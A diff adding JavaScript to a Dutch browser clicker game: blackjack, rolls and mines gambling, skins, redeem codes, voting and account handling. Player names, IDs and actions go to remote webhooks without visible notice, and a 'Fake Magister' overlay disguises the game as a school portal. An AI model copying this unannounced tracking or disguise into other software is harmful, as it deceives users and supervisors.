+            G.upgrades.push({ type: ck ? "click" : "auto", value: 1 + fl(G.upgrades.length / 2) * 2, cost: ck ? 30 * Math.pow(1.6, G.upgrades.length) : 20 * Math.pow(1.6, G.upgrades.length), bought: false });
+          }
+          updateScore(); renderUpgrades(); renderUnlockTiles();
+        }));
+      }
+
+      // ── SKINS ─────────────────────────────────────────────────────────────────────
+      function renderSkins() {
+        const list = $("skinList"), cdLeft = getSkinCDLeft(), cdInfo = $("skinCooldownInfo");
+        if (cdLeft > 0) { const m = Math.ceil(cdLeft / 60000), s = Math.ceil((cdLeft % 60000) / 1000); cdInfo.innerText = `Skin wissel cooldown: nog ${m}m ${s}s.`; }
+        else cdInfo.innerText = "Je kunt van skin wisselen.";
+        list.innerHTML = SKIN_DEFS.map(def => {
+          const owned = G.ownedSkins.includes(def.id), equipped = G.equippedSkin === def.id;
+          const imgHtml = def.img ? `<img src="${def.img}" onerror="this.style.display='none'">` : `<div style="width:70px;height:70px;background:var(--card);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:11px;color:var(--muted);margin:auto;">Binnenkort</div>`;
+          let btnHtml;
+          if (owned && equipped) btnHtml = `<button class="ownedBtn" disabled>Uitgerust</button>`;
+          else if (owned) btnHtml = `<button class="equipBtn" data-sid="${def.id}">${cdLeft > 0 ? "Cooldown" : "Equip"}</button>`;
+          else if (def.free) btnHtml = `<button class="buyBtn" data-sid="${def.id}">Gratis</button>`;
+          else if (!def.img) btnHtml = `<button class="ownedBtn" disabled>Binnenkort</button>`;
+          else btnHtml = `<button class="buyBtn" data-sid="${def.id}">Koop (${fmtShop(def.cost)})</button>`;
+          return `<div class="skinBox${equipped ? " skinEquipped" : ""}"><div>${imgHtml}</div><div class="skinName">${def.name}</div><div class="skinCost">${def.cost > 0 ? fmtShop(def.cost) + " Lantings" : "Gratis"}</div><div class="skinBonus">${def.bonusText}</div>${btnHtml}</div>`;
+        }).join("");
+        list.querySelectorAll("button[data-sid]").forEach(btn => btn.addEventListener("click", () => {
+          const id = parseInt(btn.dataset.sid), def = SKIN_DEFS.find(s => s.id === id); if (!def) return;
+          if (G.ownedSkins.includes(id)) {
+            if (G.equippedSkin === id) return;
+            const cd = getSkinCDLeft(); if (cd > 0) { const m = Math.ceil(cd / 60000), s = Math.ceil((cd % 60000) / 1000); showNotice(`Skin wissel cooldown: nog ${m}m ${s}s.`, "var(--danger)"); return; }
+            equipSkin(id); setSkinSwapTime(); return;
+          }
+          if (def.free) { G.ownedSkins.push(id); equipSkin(id); setSkinSwapTime(); renderSkins(); unlockAch("buy_skin"); return; }
+          if (G.score < def.cost) { showNotice("Niet genoeg Lantings", "var(--danger)"); return; }
+          G.score -= def.cost; G.lost += def.cost; G.ownedSkins.push(id); equipSkin(id); setSkinSwapTime();
+          unlockAch("buy_skin"); updateScore(); renderSkins();
+        }));
+      }
+      function equipSkin(id) { if (!G.ownedSkins.includes(id)) return; G.equippedSkin = id; applyEquippedSkin(); fallingImg.src = getSkinImg(); updateScore(); renderSkins(); }
+
+      // ── BLACKJACK ─────────────────────────────────────────────────────────────────
+      const SUITS = ["H", "D", "K", "S"], RANKS_BJ = ["A", "2", "3", "4", "5", "6", "7", "8", "9", "10", "J", "Q", "K"];
+      let deck = [], playerHand = [], dealerHand = [], bjInProgress = false, bjBet = 0, bjAllIn = false, bjScoreBefore = 0;
+      function createDeck() { deck = []; for (const s of SUITS) for (const r of RANKS_BJ) deck.push({ rank: r, suit: s }); for (let i = deck.length - 1; i > 0; i--) { const j = fl(Math.random() * (i + 1));[deck[i], deck[j]] = [deck[j], deck[i]]; } }
+      function cardVal(c) { if (c.rank === "A") return 11; if (["J", "Q", "K"].includes(c.rank)) return 10; return parseInt(c.rank); }
+      function handVal(h) { let v = 0, a = 0; for (const c of h) { v += cardVal(c); if (c.rank === "A") a++; } while (v > 21 && a-- > 0) v -= 10; return v; }
+      function renderCard(c) { const red = c.suit === "H" || c.suit === "D"; return `<span style="color:${red ? "#ff4f6d" : "var(--text)"}">${c.rank}${c.suit}</span>`; }
+      function renderHandHTML(h, hide) { return h.map((c, i) => (hide && i === 0) ? "??" : renderCard(c)).join(" "); }
+      function updateBJDisplay() {
+        const pv = handVal(playerHand), dv = handVal(dealerHand);
+        $("bjGame").innerHTML = `<div style="margin:30px 0;"><div class="bj-label">Dealer</div><div class="bj-hand">${renderHandHTML(dealerHand, bjInProgress)} (${bjInProgress ? "?" : dv})</div><div class="bj-label" style="margin-top:20px;">Jij</div><div class="bj-hand">${renderHandHTML(playerHand, false)} (${pv})</div></div><div class="bj-buttons">${bjInProgress ? `<button id="hitBtn">Pak</button><button id="standBtn">Stop</button>` : `<button id="newBJGameBtn">Opnieuw</button>`}</div><div class="bj-result" id="bjResult"></div>`;
+        if (bjInProgress) { $("hitBtn").onclick = bjHit; $("standBtn").onclick = bjStand; } else { $("newBJGameBtn").onclick = bjReset; }
+      }
+      function startBlackjack(betOverride) {
+        if (!canGamble("blackjack")) return;
+        const scoreBefore = G.score;
+        const bet = betOverride !== undefined ? betOverride : parseInt($("betInput").value);
+        if (!assertValidBet(bet, scoreBefore)) return;
+        bjScoreBefore = scoreBefore; bjAllIn = bet === scoreBefore; bjBet = bet; G.score -= bet; G.lost += bet;
+        if (G.score < 200) unlockAch("s_gamble_broke");
+        createDeck(); playerHand = [deck.pop(), deck.pop()]; dealerHand = [deck.pop(), deck.pop()];
+        bjInProgress = true; updateBJDisplay(); triggerGambleCooldown("blackjack");
+        sendGambleWH("Blackjack", { bet, scoreBefore: bjScoreBefore, result: "Gestart", extra: `All-in: ${bjAllIn ? "Ja" : "Nee"}` });
+        updateScore();
+      }
+      function bjHit() { if (!bjInProgress) return; playerHand.push(deck.pop()); if (handVal(playerHand) > 21) endBJ(false); else updateBJDisplay(); }
+      function bjStand() {
+        if (!bjInProgress) return; bjInProgress = false;
+        while (handVal(dealerHand) < 17) dealerHand.push(deck.pop());
+        const pv = handVal(playerHand), dv = handVal(dealerHand);
+        let win;
+        if (pv > 21) win = false; else if (dv > 21) win = true;
+        else if (pv === 21 && playerHand.length === 2 && !(dv === 21 && dealerHand.length === 2)) win = true;
+        else if (pv > dv) win = true; else if (pv === dv) win = null; else win = false;
+        endBJ(win);
+      }
+      function endBJ(win) {
+        bjInProgress = false;
+        if (win === false) { if (bjAllIn) { const luckBoost = Math.min(0.10, getLuck() / 100); if (Math.random() < 0.55 + luckBoost) { win = true; unlockAch("s_allin_win"); } } }
+        let msg, color;
+        if (win === true) {
+          const mult = (playerHand.length === 2 && handVal(playerHand) === 21) ? 3 : 2;
+          const payout = Math.max(0, fl(bjBet * mult)); G.score += payout; G.earned += payout;
+          msg = "Gewonnen! +" + fmtShop(payout); color = "var(--accent2)"; playSfx("win"); unlockAch("win_blackjack");
+          sendGambleWH("Blackjack", { bet: bjBet, scoreBefore: bjScoreBefore, result: "GEWONNEN +" + fmtShop(payout), extra: `Dealer: ${handVal(dealerHand)} | Speler: ${handVal(playerHand)}` });
+        } else if (win === false) {
+          msg = "Verloren!"; color = "var(--danger)"; playSfx("lose");
+          // Check bankroet: all-in on highest, lost everything
+          if (bjAllIn && bjScoreBefore >= G.highest && G.score === 0) unlockAch("s_lose_all");
+          sendGambleWH("Blackjack", { bet: bjBet, scoreBefore: bjScoreBefore, result: "VERLOREN", extra: `Dealer: ${handVal(dealerHand)} | Speler: ${handVal(playerHand)}` });
+        } else {
+          G.score += bjBet; msg = "Gelijkspel! Inzet terug."; color = "var(--gold)";
+          sendGambleWH("Blackjack", { bet: bjBet, scoreBefore: bjScoreBefore, result: "GELIJKSPEL", extra: `Dealer: ${handVal(dealerHand)} | Speler: ${handVal(playerHand)}` });
+        }
+        updateBJDisplay(); const r = $("bjResult"); r.innerText = msg; r.style.color = color; updateScore();
+      }
+      function bjReset() { playerHand = []; dealerHand = []; bjInProgress = false; bjBet = 0; bjAllIn = false; $("betInput").value = ""; updateBJDisplay(); }
+
+      // ── ROLLS ─────────────────────────────────────────────────────────────────────
+      // Added 0.25, 1 (neutral), 2.5, 3 to pools
+      function getRollPick(luck) {
+        const red = [0.1, 0.25, 0.5, 0.75], green = [1.25, 1.5, 2, 2.5, 3], neutral = [1];
+        const r = Math.random();
+        // Base: 51% bad, 10% neutral, 39% good (avg 1.1x)
+        // Luck increases good chance, decreases bad
+        const baseGood = 0.39;
+        const luckBoost = Math.min(0.30, luck / 100);
+        const wc = baseGood + luckBoost;
+        const nc = 0.10;
+        if (r < nc) return neutral[fl(Math.random() * neutral.length)];
+        if (r < nc + wc) return green[fl(Math.random() * green.length)];
+        return red[fl(Math.random() * red.length)];
+      }
+      function rollClass(m) { return m < 1 ? "bad" : m === 1 ? "neutral" : "good"; }
+      function playRolls(opts) {
+        if (!canGamble("rolls")) return;
+        const allIn = opts && opts.allIn;
+        const scoreBefore = G.score;
+        const bet = (opts && opts.bet !== undefined) ? opts.bet : parseInt($("rollBet").value);
+        if (!assertValidBet(bet, scoreBefore)) return;
+        G.score -= bet; G.lost += bet;
+        if (G.score < 200) unlockAch("s_gamble_broke");
+        const count = Math.min(5, Math.max(3, parseInt($("rollCount").value) || 3));
+        const luck = getLuck() + (allIn ? 10 : 0);
+        const mults = Array.from({ length: count }, () => getRollPick(luck));
+        const perRoll = bet / count, total = Math.max(0, cl(mults.reduce((s, m) => s + perRoll * m, 0)));
+        G.score += total; G.earned += total;
+        const won = total >= bet; if (won) unlockAch("win_rolls");
+        $("rollResult").innerHTML = `<div class="roll-grid">${mults.map(x => `<div class="rollMult ${rollClass(x)}">${x}x</div>`).join("")}</div><div class="roll-total">Totaal: ${fmtShop(total)} Lantings</div>`;
+        $("rollMeta").innerText = "Luck: +" + luck + "%";
+        triggerGambleCooldown("rolls"); playSfx(won ? "win" : "lose");
+        sendGambleWH("Rolls", { bet, scoreBefore, result: (won ? "GEWONNEN" : "VERLOREN") + " " + fmtShop(total), extra: `Multipliers: ${mults.join(", ")} | Rolls: ${count} | Luck: +${luck}%` });
+        updateScore();
+      }
+
+      // ── MINES ─────────────────────────────────────────────────────────────────────
+      let minesState = { active: false, size: 5, mines: 3, bet: 0, multiplier: 1, safe: 0, bombSet: new Set(), opened: new Set(), scoreBefore: 0 };
+      function mineGain(size, mines, luck) { const ratio = mines / (size * size); const lm = 1 + (luck / 100) * 0.12; const baseGain = Math.pow(ratio, 3.2) * 18; const nerf = ratio > 0.3 ? 1 - (ratio - 0.3) * 0.5 : 1; return Math.max(0.00003, baseGain * nerf * lm); }
+      function resetMinesBoard() {
+        const board = $("minesBoard"); board.style.gridTemplateColumns = `repeat(${minesState.size},1fr)`;
+        const total = minesState.size * minesState.size, frag = document.createDocumentFragment();
+        for (let i = 0; i < total; i++) { const tile = document.createElement("button"); tile.className = "mine-tile"; tile.dataset.idx = String(i); tile.textContent = "?"; tile.addEventListener("click", () => onMineClick(i)); frag.appendChild(tile); }
+        board.innerHTML = ""; board.appendChild(frag);
+      }
+      function startMinesGame(opts) {
+        if (!canGamble("mines")) return;
+        const allIn = opts && opts.allIn; const scoreBefore = G.score;
+        const bet = (opts && opts.bet !== undefined) ? opts.bet : parseInt($("minesBet").value);
+        if (!assertValidBet(bet, scoreBefore)) return;
+        const size = Math.min(10, Math.max(5, parseInt($("minesSize").value) || 5));
+        const mines = Math.max(1, Math.min(size * size - 1, parseInt($("minesCount").value) || 1));
+        if (allIn) addLuck(20000);
+        const luck = getLuck() + (allIn ? 10 : 0);
+        const reducedMines = Math.max(1, mines - fl(mines * (luck / 100) * 0.10));
+        G.score -= bet; G.lost += bet;
+        if (G.score < 200) unlockAch("s_gamble_broke");
+        minesState = { active: true, size, mines: reducedMines, bet, multiplier: 1, safe: 0, bombSet: new Set(), opened: new Set(), scoreBefore };
+        while (minesState.bombSet.size < reducedMines) minesState.bombSet.add(fl(Math.random() * size * size));
+        resetMinesBoard();
+        const st = $("minesStatus"); st.style.color = "var(--muted)"; st.innerText = "Spel gestart. Luck: +" + luck + "% | Grid: " + size + "x" + size + " | Mijnen: " + reducedMines;
+        triggerGambleCooldown("mines");
+        sendGambleWH("Mines", { bet, scoreBefore, result: "Gestart", extra: `Grid: ${size}x${size} | Mijnen: ${reducedMines} | Luck: +${luck}% | All-in: ${allIn ? "Ja" : "Nee"}` });
+        updateScore();
+      }
+      function revealMineTile(idx, bomb) { const tile = $("minesBoard").querySelector(`[data-idx="${idx}"]`); if (!tile) return; tile.disabled = true; tile.textContent = bomb ? "💣" : "💰"; tile.classList.add(bomb ? "bomb" : "safe"); }
+      function endMinesGame(won, msg) {
+        minesState.active = false;
+        for (let i = 0; i < minesState.size * minesState.size; i++)if (minesState.bombSet.has(i)) revealMineTile(i, true);
+        const st = $("minesStatus"); st.style.color = won ? "var(--accent2)" : "var(--danger)"; st.innerText = msg;
+        playSfx(won ? "win" : "lose"); updateScore();
+      }
+      function onMineClick(idx) {
+        if (!minesState.active || minesState.opened.has(idx)) return;
+        minesState.opened.add(idx);
+        if (minesState.bombSet.has(idx)) {
+          revealMineTile(idx, true);
+          sendGambleWH("Mines", { bet: minesState.bet, scoreBefore: minesState.scoreBefore, result: "VERLOREN (mijn geraakt)", extra: `Safe tiles: ${minesState.safe} | Multiplier: x${minesState.multiplier.toFixed(4)}` });
+          endMinesGame(false, "Je hebt verloren"); return;
+        }
+        revealMineTile(idx, false); minesState.safe++;
+        const gain = mineGain(minesState.size, minesState.mines, getLuck());
+        minesState.multiplier *= (1 + gain);
+        const st = $("minesStatus"); st.style.color = "var(--gold)"; st.innerText = "Multiplier: x" + minesState.multiplier.toFixed(4);
+        playSfx("safe");
+      }
+      function cashoutMines() {
+        if (!minesState.active) return;
+        const payout = Math.max(0, cl(minesState.bet * minesState.multiplier));
+        G.score += payout; G.earned += payout; triggerGambleCooldown("mines");
+        unlockAch("cashout_mines"); if (payout >= minesState.bet * 5) unlockAch("s_mines_big_win");
+        sendGambleWH("Mines", { bet: minesState.bet, scoreBefore: minesState.scoreBefore, result: `CASH OUT +${fmtShop(payout)}`, extra: `Multiplier: x${minesState.multiplier.toFixed(4)} | Safe tiles: ${minesState.safe} | Grid: ${minesState.size}x${minesState.size}` });
+        endMinesGame(true, "Cash out! +" + fmtShop(payout) + " Lantings");
+      }
+
+      // ── CODES ─────────────────────────────────────────────────────────────────────
+      const usedCodes = new Set();
+      const VALID_CODES = {
+        "gamble69": () => { activateBoost("gamble"); unlockAch("s_code_used"); sendWH(WH.codes, `🔑 Code gebruikt | ${G.name} (ID:${G.uid}): gamble69`); return { msg: "Gamble geluk boost! (20s)", color: "var(--accent2)" }; },
+        "netanyahu": () => { boosts.doubleClick = Date.now() + 60000; applyEquippedSkin(); updateScore(); unlockAch("s_code_used"); sendWH(WH.codes, `🔑 Code gebruikt | ${G.name} (ID:${G.uid}): netanyahu`); return { msg: "2x klikken voor 60 seconden!", color: "var(--gold)" }; },
+        "shalom": () => { boosts.doubleClick = Date.now() + 30000; applyEquippedSkin(); updateScore(); unlockAch("s_code_used"); sendWH(WH.codes, `🔑 Code gebruikt | ${G.name} (ID:${G.uid}): shalom`); return { msg: "✡ 2x klikken voor 30 seconden!", color: "var(--gold)" }; },
+        "freemoney": () => { const loss = fl(G.score * 0.10); G.score = Math.max(0, G.score - loss); G.lost += loss; updateScore(); sendWH(WH.codes, `🔑 Code gebruikt | ${G.name} (ID:${G.uid}): freemoney (-10%)`); return { msg: "freemoney... je verloor 10% van je geld!", color: "var(--danger)" }; },
+        "wlanting": () => { const bonus = fl(G.score * 0.15); G.score += bonus; G.earned += bonus; updateScore(); unlockAch("s_code_used"); sendWH(WH.codes, `🔑 Code gebruikt | ${G.name} (ID:${G.uid}): wlanting (+15%)`); return { msg: "Wlanting! +15% geld!", color: "var(--accent2)" }; },
+      };
+      function submitCode() {
+        const input = $("codeInput"), msgEl = $("codeMsg"), code = input.value.trim().toLowerCase();
+        if (!code) return;
+        if (usedCodes.has(code)) { msgEl.style.color = "var(--danger)"; msgEl.innerText = "Code al gebruikt!"; return; }
+        if (VALID_CODES[code]) { usedCodes.add(code); const r = VALID_CODES[code](); msgEl.style.color = r.color; msgEl.innerText = r.msg; input.value = ""; }
+        else { msgEl.style.color = "var(--danger)"; msgEl.innerText = "Ongeldige code."; }
+      }
+
+      // ── VOTE ──────────────────────────────────────────────────────────────────────
+      function openVotePanel() {
+        const oldVote = localStorage.getItem(VOTE_KEY);
+        const info = $("voteInfo"); info.style.color = "var(--muted)"; info.innerText = oldVote ? "Jouw stem: " + oldVote : "Je hebt nog niet gestemd.";
+        if (oldVote) { const sel = document.querySelector(`input[name="voteOption"][value="${oldVote}"]`); if (sel) sel.checked = true; }
+        openOverlay("votePanel");
+      }
+      function submitVote() {
+        const sel = document.querySelector("input[name='voteOption']:checked");
+        if (!sel) { showNotice("Kies eerst een optie", "var(--danger)"); return; }
+        const choice = sel.value, oldVote = localStorage.getItem(VOTE_KEY);
+        if (oldVote && oldVote !== choice) { showNotice("Je kan maar 1 keer stemmen", "var(--danger)"); return; }
+        if (!oldVote) { localStorage.setItem(VOTE_KEY, choice); sendWH(WH.vote, `vote | ${G.name} | ${choice}`); showNotice("Stem verzonden: " + choice, "var(--accent2)"); unlockAch("s_vote"); }
+        else showNotice("Je stem staat al op: " + oldVote, "var(--gold)");
+        closeOverlay("votePanel");
+      }
+
+      // ── SUGGESTION ────────────────────────────────────────────────────────────────
+      function sendSuggestion() {
+        const input = $("suggestionInput"), msg = input.value.trim(); if (!msg) return;
+        const rem = 180000 - (Date.now() - lastSuggTime);
+        if (lastSuggTime > 0 && rem > 0) { showNotice("Cooldown actief, wacht tot je opnieuw een suggestie kunt sturen.", "var(--danger)"); return; }
+        sendWH(WH.sugg, `${G.name}: ${msg}`);
+        input.value = ""; closeOverlay("suggestionPanel");
+        lastSuggTime = Date.now(); localStorage.setItem(LAST_SUGG_KEY, lastSuggTime);
+        unlockAch("s_suggestion"); updateSuggBtn(); showNotice("Suggestion verzonden", "var(--accent2)");
+      }
+
+      // ── ACCOUNTS ──────────────────────────────────────────────────────────────────
+      function renderAccountsPanel() {
+        const list = $("accList");
+        list.innerHTML = accounts.map(acc => {
+          const isActive = acc.uid === activeId;
+          return `<div class="acc-row${isActive ? " active-acc" : ""}"><div class="acc-info"><div class="acc-name">${acc.name}${isActive ? " ✓" : ""}</div><div class="acc-id">ID: ${acc.uid}</div><div class="acc-score">${fmtMain(acc.score || 0)} Lantings</div></div>${!isActive ? `<button class="acc-switch-btn" data-uid="${acc.uid}">Switch</button>` : "<span style='font-size:11px;color:var(--accent2);'>Actief</span>"}${!isActive && accounts.length > 1 ? `<button class="acc-del-btn" data-uid="${acc.uid}">✕</button>` : ""}</div>`;
+        }).join("");
+        list.querySelectorAll(".acc-switch-btn").forEach(btn => btn.addEventListener("click", () => {
+          saveActive(); activeId = btn.dataset.uid; setActiveId(activeId);
+          G = Object.assign({}, accounts.find(a => a.uid === activeId));
+          G.unlockedAch = G.unlockedAch || {}; G.claimedAch = G.claimedAch || {}; G.themesUsed = G.themesUsed || []; G.totalClicks = G.totalClicks || 0;
+          if (!G.upgrades || !G.upgrades.length) { G.upgrades = []; for (let i = 0; i < 50; i++) { const ck = i % 2 === 0; G.upgrades.push({ type: ck ? "click" : "auto", value: 1 + fl(i / 2) * 2, cost: ck ? 30 * Math.pow(1.6, i) : 20 * Math.pow(1.6, i), bought: false }); } }
+          boosts = { click: 0, ps: 0, doubleClick: 0, shopDiscount: 0 }; gambleLuckUntil = 0; lastCmdCode = null;
+          closeOverlay("accountsPanel"); updateScore(); renderUnlockTiles(); renderUpgrades();
+          showNotice("Geswitcht naar: " + G.name, "var(--accent2)");
+        }));
+        list.querySelectorAll(".acc-del-btn").forEach(btn => btn.addEventListener("click", () => {
+          const uid = btn.dataset.uid; if (!confirm("Weet je zeker dat je dit account wilt verwijderen?")) return;
+          accounts = accounts.filter(a => a.uid !== uid); saveAccounts(accounts); renderAccountsPanel();
+        }));
+      }
+      async function createNewAccount() {
+        const name = $("newAccName").value.trim(), msgEl = $("newAccMsg");
+        if (!name || name.length < 2) { msgEl.style.color = "var(--danger)"; msgEl.innerText = "Naam te kort (min 2 tekens)."; return; }
+        if (!isValidName(name)) { msgEl.style.color = "var(--danger)"; msgEl.innerText = "Naam mag alleen letters en cijfers bevatten."; return; }
+        if (isBanned(name)) { msgEl.style.color = "var(--danger)"; msgEl.innerText = "Die naam is niet toegestaan."; return; }
+        if (accounts.length >= 5) { msgEl.style.color = "var(--danger)"; msgEl.innerText = "Maximum van 5 accounts bereikt."; return; }
+        if (accounts.some(a => a.name.toLowerCase() === name.toLowerCase())) { msgEl.style.color = "var(--danger)"; msgEl.innerText = "Je hebt al een account met die naam."; return; }
+        msgEl.style.color = "var(--muted)"; msgEl.innerText = "Naam controleren...";
+        const taken = await isNameTakenFirebase(name);
+        if (taken) { msgEl.style.color = "var(--danger)"; msgEl.innerText = "Die naam is al in gebruik."; return; }
+        const uid = genUID(); const newAcc = createDefaultSave(name, uid);
+        accounts.push(newAcc); saveAccounts(accounts); $("newAccName").value = "";
+        msgEl.style.color = "var(--accent2)"; msgEl.innerText = "Account aangemaakt: " + name;
+        unlockAch("s_second_acc"); renderAccountsPanel();
+        sendWH(WH.login, `nieuw account: ${name} (ID: ${uid})`);
+      }
+
+      // ── NAME VALIDATION CHECK ─────────────────────────────────────────────────────
+      function needsRename() { return G.name && !isValidName(G.name); }
+
+      // ── CONFIRM NAME ──────────────────────────────────────────────────────────────
+      async function confirmName() {
+        const raw = $("nameInput").value.trim(), errEl = $("nameError");
+        if (!raw || raw.length < 2) { errEl.innerText = raw ? "Min 2 tekens." : "Voer een naam in."; return; }
+        if (!isValidName(raw)) { errEl.innerText = "Naam mag alleen letters (a-z) en cijfers (0-9) bevatten."; return; }
+        if (isBanned(raw)) { errEl.innerText = "Die naam is niet toegestaan."; return; }
+        errEl.innerText = "Naam controleren...";
+        const taken = await isNameTakenFirebase(raw);
+        if (taken) { errEl.innerText = "Die naam is al in gebruik."; return; }
+        errEl.innerText = "";
+        const uid = genUID(); const acc = createDefaultSave(raw, uid);
+        accounts = [acc]; saveAccounts(accounts); activeId = uid; setActiveId(uid);
+        G = Object.assign({}, acc); G.unlockedAch = {}; G.claimedAch = {}; G.themesUsed = [];
+        sendWH(WH.login, `player logged in: ${raw} (ID: ${uid})`);
+        $("nameSection").style.display = "none"; $("playBtn").style.display = "block";
+        const od = getOfflineBonus();
+        $("offlineBonus").innerText = od.minutes > 0 ? `+ ${fmtMain(od.bonus)} Lantings (offline bonus)` : "";
+        $("offlineTime").innerText = od.minutes > 0 ? `Je bent ${od.minutes} minuten offline geweest` : "";
+      }
+
+      // ── NAME CHANGE ───────────────────────────────────────────────────────────────
+      async function changeNameInSettings() {
+        const raw = $("nameChangeInput").value.trim(), msgEl = $("nameChangeMsg");
+        if (!raw || raw.length < 2) { msgEl.style.color = "var(--danger)"; msgEl.innerText = raw ? "Min 2 tekens." : "Voer naam in."; return; }
+        if (!isValidName(raw)) { msgEl.style.color = "var(--danger)"; msgEl.innerText = "Naam mag alleen letters en cijfers bevatten."; return; }
+        if (isBanned(raw)) { msgEl.style.color = "var(--danger)"; msgEl.innerText = "Niet toegestaan."; return; }
+        if (raw.toLowerCase() === G.name.toLowerCase()) { msgEl.style.color = "var(--muted)"; msgEl.innerText = "Dat is al je naam."; return; }
+        // 1 hour cooldown
+        const lastChange = parseInt(localStorage.getItem(NAME_CHANGE_CD_KEY + G.uid)) || 0;
+        const cdLeft = 7200000 - (Date.now() - lastChange);
+        if (lastChange > 0 && cdLeft > 0) { const m = Math.ceil(cdLeft / 60000); msgEl.style.color = "var(--danger)"; msgEl.innerText = `Naam wijzigen kan pas over ${m} minuten.`; return; }
+        if (accounts.some(a => a.uid !== G.uid && a.name.toLowerCase() === raw.toLowerCase())) { msgEl.style.color = "var(--danger)"; msgEl.innerText = "Je hebt al een account met die naam."; return; }
+        msgEl.style.color = "var(--muted)"; msgEl.innerText = "Naam controleren...";
+        const taken = await isNameTakenFirebase(raw);
+        if (taken) { msgEl.style.color = "var(--danger)"; msgEl.innerText = "Die naam is al in gebruik."; return; }
+        const oldName = G.name; G.name = raw;
+        localStorage.setItem(NAME_CHANGE_CD_KEY + G.uid, Date.now());
+        $("nameChangeInput").value = ""; msgEl.style.color = "var(--accent2)"; msgEl.innerText = "Naam gewijzigd naar: " + raw;
+        sendWH(WH.login, `name change: ${oldName} → ${raw} (ID: ${G.uid})`);
+        // Update Firebase: same uid key, new name
+        renameFirebaseEntry(G.uid, raw, G.uid, G.score);
+        updateScore();
+      }
+
+      function getOfflineBonus() {
+        const last = G.lastOnline || Date.now(), mins = fl((Date.now() - last) / 60000);
+        return { minutes: mins, bonus: mins > 0 ? fl(G.perSecond * 0.40 * mins) : 0 };
+      }
+
+      // ── START SCREEN ──────────────────────────────────────────────────────────────
+      const storedName = G.name, hasPlayed = G.lastOnline && G.lastOnline !== G.createdAt;
+      if (!storedName) { $("playBtn").style.display = "none"; $("nameSection").style.display = "flex"; }
+      else {
+        // Check if existing name needs renaming
+        if (needsRename()) {
+          $("playBtn").style.display = "none"; $("nameSection").style.display = "flex";
+          $("nameError").innerText = "Je naam mag alleen letters en cijfers bevatten. Kies een nieuwe naam.";
+          $("nameInput").value = G.name.replace(/[^a-zA-Z0-9]/g, "");
+        } else {
+          const od = getOfflineBonus();
+          if (od.minutes > 0) { $("offlineBonus").innerText = `+ ${fmtMain(od.bonus)} Lantings (offline bonus)`; $("offlineTime").innerText = `Je bent ${od.minutes} minuten offline geweest`; }
+        }
+      }
+      if (hasPlayed && storedName && !needsRename() && accounts.length > 0) { $("startScreen").style.display = "none"; $("main").style.display = "flex"; }
+
+      // ── EVENT LISTENERS ───────────────────────────────────────────────────────────
+      $("confirmNameBtn").addEventListener("click", confirmName);
+      $("nameInput").addEventListener("keydown", e => { if (e.key === "Enter") confirmName(); });
+      $("playBtn").addEventListener("click", () => {
+        if (!G.name) { $("playBtn").style.display = "none"; $("nameSection").style.display = "flex"; return; }
+        sendWH(WH.main, `client connected: ${G.name} (ID: ${G.uid})`);
+        const od = getOfflineBonus(); G.score += od.bonus; G.earned += od.bonus;
+        $("startScreen").style.display = "none"; $("main").style.display = "flex"; updateScore();
+      });
+      clickBtn.addEventListener("mousedown", () => { recordClick(true); triggerClickAnim(); doClick(true); });
+      let clickLockKey = false, click2Lock = false;
+      document.addEventListener("keydown", e => {
+        if (waitingForKey) {
+          e.preventDefault(); let disp = e.key.length === 1 ? e.key.toUpperCase() : e.key;
+          if (e.key === " ") disp = "SPACE"; if (e.key === "Enter") disp = "ENTER";
+          G.score -= KEYBIND_CHANGE_COST; G.lost += KEYBIND_CHANGE_COST; G.keybind = e.key; G.keybindDisplay = disp;
+          keybindBtn.innerText = disp; waitingForKey = false; unlockAch("s_keybind_set"); showNotice("Keybind 1: " + disp, "var(--accent2)"); updateScore(); return;
+        }
+        if (waitingForKey2) {
+          e.preventDefault(); let disp = e.key.length === 1 ? e.key.toUpperCase() : e.key;
+          if (e.key === " ") disp = "SPACE"; if (e.key === "Enter") disp = "ENTER";
+          G.score -= KEYBIND_CHANGE_COST; G.lost += KEYBIND_CHANGE_COST; G.keybind2 = e.key; G.keybind2Display = disp;
+          keybind2Btn.innerText = disp; waitingForKey2 = false; showNotice("Keybind 2: " + disp, "var(--accent2)"); updateScore(); return;
+        }
+        if (waitingForKey3) {
+          e.preventDefault(); let disp = e.key.length === 1 ? e.key.toUpperCase() : e.key;
+          if (e.key === " ") disp = "SPACE"; if (e.key === "Enter") disp = "ENTER";
+          G.fakeMagisterKeybind = e.key; G.fakeMagisterKeybindDisplay = disp;
+          $("fakeMagisterKeybindBtn").innerText = disp; waitingForKey3 = false; showNotice("Fake Magister Keybind: " + disp, "var(--accent2)"); updateScore(); return;
+        }
+        if (e.repeat || !isMainActive()) return;
+        const kb = G.keybind || "Enter", kb2 = G.keybind2 || "";
+        if (e.key === kb || e.key.toLowerCase() === kb.toLowerCase()) {
+          e.preventDefault();
+          // Record for display CPS (keybind = not mouse)
+          recordClick(false);
+          triggerClickAnim();
+          if (!clickLockKey) { clickLockKey = true; doClick(false); setTimeout(() => { clickLockKey = false; }, 40); }
+          return;
+        }
+        if (G.unlockedKeybind2 && kb2 && (e.key === kb2 || e.key.toLowerCase() === kb2.toLowerCase())) {
+          e.preventDefault(); recordClick(false);
+          if (!click2Lock) { click2Lock = true; triggerClickAnim(); doClick(false); setTimeout(() => { click2Lock = false; }, 40); }
+        }
+        const fmkb = G.fakeMagisterKeybind || "";
+        if (fmkb && (e.key === fmkb || e.key.toLowerCase() === fmkb.toLowerCase())) {
+          e.preventDefault();
+          G.fakeMagisterActive = !G.fakeMagisterActive;
+          $("fakeMagisterOverlay").style.display = G.fakeMagisterActive ? "block" : "none";
+          showNotice(G.fakeMagisterActive ? "Fake Magister geactiveerd" : "Fake Magister gedeactiveerd", "var(--accent2)");
+          updateScore();
+        }
+      });
+      document.addEventListener("keyup", () => { clickLock = false; click2Lock = false; clickLockKey = false; });
+      keybindBtn.addEventListener("click", () => {
+        if (waitingForKey) { waitingForKey = false; keybindBtn.innerText = G.keybindDisplay || "ENTER"; return; }
+        if (G.score < KEYBIND_CHANGE_COST) { showNotice("Je hebt " + fmtMain(KEYBIND_CHANGE_COST) + " Lantings nodig", "var(--danger)"); return; }
+        waitingForKey = true; keybindBtn.innerText = "Druk een toets..."; showNotice("Druk nu een toets in voor keybind 1", "var(--accent2)");
+      });
+      keybind2Btn.addEventListener("click", () => {
+        if (!G.unlockedKeybind2) {
+          if (G.score < KEYBIND2_UNLOCK_COST) { showNotice("Je hebt " + fmtMain(KEYBIND2_UNLOCK_COST) + " Lantings nodig", "var(--danger)"); return; }
